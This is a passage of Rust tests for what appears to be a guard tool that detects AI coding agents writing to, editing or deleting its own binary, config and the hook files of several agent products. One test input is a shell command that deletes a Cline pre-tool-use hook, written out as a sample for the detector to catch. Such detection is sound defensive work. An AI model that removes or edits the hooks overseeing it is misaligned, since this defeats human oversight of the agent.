            opencode_settings: vec![PathBuf::from("/repo/.opencode/plugins/ptuf.ts")],
            ..ProtectedPaths::default()
        };
        let input = HookInput {
            tool_name: "Write".into(),
            tool_input: serde_json::json!({
                "file_path": "/repo/.opencode/plugins/ptuf.ts"
            }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::OpencodeSettings));
    }

    #[test]
    fn match_path_detects_pi_settings_targets() {
        let p = ProtectedPaths {
            pi_settings: vec![
                PathBuf::from("/repo/.pi/settings.json"),
                PathBuf::from("/home/user/.pi/agent/extensions/ptuf/index.ts"),
            ],
            ..ProtectedPaths::default()
        };
        assert_eq!(
            p.match_path(Path::new("/repo/.pi/settings.json")),
            Some(ProtectedKind::PiSettings)
        );
        assert_eq!(
            p.match_path(Path::new("/home/user/.pi/agent/extensions/ptuf/index.ts")),
            Some(ProtectedKind::PiSettings)
        );
    }

    #[test]
    fn protected_kind_opencode_settings_as_str() {
        assert_eq!(
            ProtectedKind::OpencodeSettings.as_str(),
            "opencode_settings"
        );
    }

    #[test]
    fn match_path_detects_opencode_settings_targets() {
        let p = ProtectedPaths {
            opencode_settings: vec![
                PathBuf::from("/xdg/opencode/plugins/ptuf.ts"),
                PathBuf::from("/xdg/opencode/plugin/ptuf.ts"),
                PathBuf::from("/repo/.opencode/plugins/ptuf.ts"),
                PathBuf::from("/repo/.opencode/plugin/ptuf.ts"),
            ],
            ..ProtectedPaths::default()
        };
        assert_eq!(
            p.match_path(Path::new("/xdg/opencode/plugins/ptuf.ts")),
            Some(ProtectedKind::OpencodeSettings)
        );
        assert_eq!(
            p.match_path(Path::new("/xdg/opencode/plugin/ptuf.ts")),
            Some(ProtectedKind::OpencodeSettings)
        );
        assert_eq!(
            p.match_path(Path::new("/repo/.opencode/plugins/ptuf.ts")),
            Some(ProtectedKind::OpencodeSettings)
        );
        assert_eq!(
            p.match_path(Path::new("/repo/.opencode/plugin/ptuf.ts")),
            Some(ProtectedKind::OpencodeSettings)
        );
    }

    #[test]
    fn collect_includes_cursor_hooks_json_in_both_scopes() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        assert!(
            p.cursor_settings
                .iter()
                .any(|q| q == &PathBuf::from("/repo/.cursor/hooks.json"))
        );
        assert!(
            p.cursor_settings
                .iter()
                .any(|q| q == &PathBuf::from("/h/.cursor/hooks.json"))
        );
    }

    #[test]
    fn classify_matches_edit_of_cursor_settings() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Edit".into(),
            tool_input: serde_json::json!({ "file_path": "/repo/.cursor/hooks.json" }),
        };
        assert!(
            p.classify_input(&input)
                .contains(&ProtectedKind::CursorSettings)
        );
    }

    #[test]
    fn collect_extracts_hook_scripts_from_cursor_hooks_json() {
        let dir = std::env::temp_dir().join(format!(
            "ptuf-self-paths-cursor-{}-{}",
            std::process::id(),
            line!()
        ));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(dir.join(".cursor")).expect("mkdir");
        std::fs::write(
            dir.join(".cursor/hooks.json"),
            r#"{
  "version": 1,
  "hooks": {
    "preToolUse": [
      { "command": "./hooks/guard.sh hook cursor", "matcher": "Shell" }
    ]
  }
}"#,
        )
        .expect("write hooks");
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(&dir), &cfg, &env);
        assert!(
            p.hook_scripts
                .iter()
                .any(|path| path == &dir.join("./hooks/guard.sh")),
            "expected hook script from cursor hooks.json, got {:?}",
            p.hook_scripts
        );
        let _ = std::fs::remove_dir_all(&dir);
    }

    #[test]
    fn collect_includes_cline_hook_wrappers_in_both_scopes() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        for expected in [
            "/repo/.clinerules/hooks/PreToolUse",
            "/repo/.clinerules/hooks/PreToolUse.ps1",
            "/h/Documents/Cline/Hooks/PreToolUse",
            "/h/Documents/Cline/Hooks/PreToolUse.ps1",
        ] {
            assert!(
                p.cline_settings
                    .iter()
                    .any(|q| q == &PathBuf::from(expected)),
                "missing {expected} in {:?}",
                p.cline_settings
            );
        }
    }

    #[test]
    fn classify_matches_rm_of_cline_hook_wrapper() {
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Bash".into(),
            tool_input: serde_json::json!({
                "command": "rm -f /repo/.clinerules/hooks/PreToolUse"
            }),
        };
        assert!(
            p.classify_input(&input)
                .contains(&ProtectedKind::ClineSettings)
        );
    }

    #[test]
    fn protected_kind_cursor_and_cline_as_str() {
        assert_eq!(ProtectedKind::CursorSettings.as_str(), "cursor_settings");
        assert_eq!(ProtectedKind::ClineSettings.as_str(), "cline_settings");
    }

    #[test]
    fn protected_kinds_holds_every_variant() {
        let all = [
            ProtectedKind::Binary,
            ProtectedKind::Config,
            ProtectedKind::Plugin,
            ProtectedKind::ClaudeSettings,
            ProtectedKind::CodexSettings,
            ProtectedKind::HookScript,
            ProtectedKind::CopilotSettings,
            ProtectedKind::KiroSettings,
            ProtectedKind::PiSettings,
            ProtectedKind::OpencodeSettings,
            ProtectedKind::CursorSettings,
            ProtectedKind::ClineSettings,
        ];
        let kinds = ProtectedKinds::from(all.as_slice());
        assert_eq!(kinds.as_slice(), &all);
    }

    #[test]
    fn classify_matches_edit_of_binary_path() {
        let p = ProtectedPaths {
            binary: Some(PathBuf::from("/usr/bin/ptuf")),
            ..ProtectedPaths::default()
        };
        let input = HookInput {
            tool_name: "Edit".into(),
            tool_input: serde_json::json!({ "file_path": "/usr/bin/ptuf" }),
        };
        let labels = p.classify_input(&input);
        assert!(labels.contains(&ProtectedKind::Binary));
    }

    #[test]
    fn classify_skips_non_writer_bash_head_with_positional_path() {
        // `echo` is not in the writer_heads allowlist, so its positional
        // arguments — even when they look like protected targets — must
        // not be added to the candidate set. This pins the
        // `!writer_heads.contains(&argv.head_basename())` skip branch.
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Bash".into(),
            tool_input: serde_json::json!({
                "command": "echo /repo/.claude/settings.json"
            }),
        };
        assert!(
            p.classify_input(&input).is_empty(),
            "echo with a path positional must not match — head is not in writer_heads"
        );
    }

    #[test]
    fn classify_skips_self_positional_for_writer_head() {
        // `rm rm` has a positional that equals the head; the
        // `if a == head { continue; }` branch must skip it so the
        // writer-head literal does not get classified as a destination.
        let env = MapEnv::new(&[("HOME", "/h")]);
        let cfg = Config::default();
        let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
        let input = HookInput {
            tool_name: "Bash".into(),
            tool_input: serde_json::json!({ "command": "rm rm" }),
        };
        // No protected path equals "rm", so the result is empty either
        // way — but the assertion records the intent and stops anyone
        // re-introducing the literal as a candidate.
        assert!(p.classify_input(&input).is_empty());
    }

    use crate::testing::proptest::{protected_kind, richer_hook_input};
    use proptest::prelude::*;

    proptest! {
        // ProtectedKind::as_str is total and the labels are non-empty.
        #[test]
        fn pbt_kind_label_is_non_empty(k in protected_kind()) {
            prop_assert!(!k.as_str().is_empty());
        }

        // An empty ProtectedPaths classifies every input as
        // non-protected. This is the safe-baseline guarantee that
        // self-protection rules rely on when running outside a repo.
        #[test]
        fn pbt_empty_protected_classifies_to_empty(input in richer_hook_input()) {
            let p = ProtectedPaths::default();
            prop_assert!(p.classify_input(&input).is_empty());
        }

        // classify_input must not panic for any well-formed HookInput
        // shape, including arbitrary Bash strings, missing fields, and
        // non-string payload values.
        #[test]
        fn pbt_classify_never_panics(input in richer_hook_input()) {
            let env = MapEnv::new(&[("HOME", "/h")]);
            let cfg = Config::default();
            let p = ProtectedPaths::collect_with_env(Some(Path::new("/repo")), &cfg, &env);
            let _ = p.classify_input(&input);
        }

        // collect_with_env over an arbitrary HOME / repo path never
        // panics and always yields a `ProtectedPaths` whose lists are
        // sorted-deduplicated invariants.
        #[test]
        fn pbt_collect_yields_sorted_dedup_lists(
            home in "/(?:home|h)/[a-z0-9_]{1,8}",
            repo in "/(?:repo|src|home/[a-z]{1,5}/proj)",
        ) {
            let env = MapEnv::new(&[("HOME", home.as_str())]);
            let cfg = Config::default();
            let p = ProtectedPaths::collect_with_env(Some(Path::new(&repo)), &cfg, &env);
            // claude_settings is the only list whose ordering matters
            // for the dedup contract; verify it's sorted and unique.
            let mut sorted = p.claude_settings.clone();
            sorted.sort();
            sorted.dedup();
            prop_assert_eq!(p.claude_settings.clone(), sorted);
            // configs is also sort+dedup'd.
            let mut sorted_cfg = p.configs.clone();
            sorted_cfg.sort();
            sorted_cfg.dedup();
            prop_assert_eq!(p.configs.clone(), sorted_cfg);
        }
    }
}
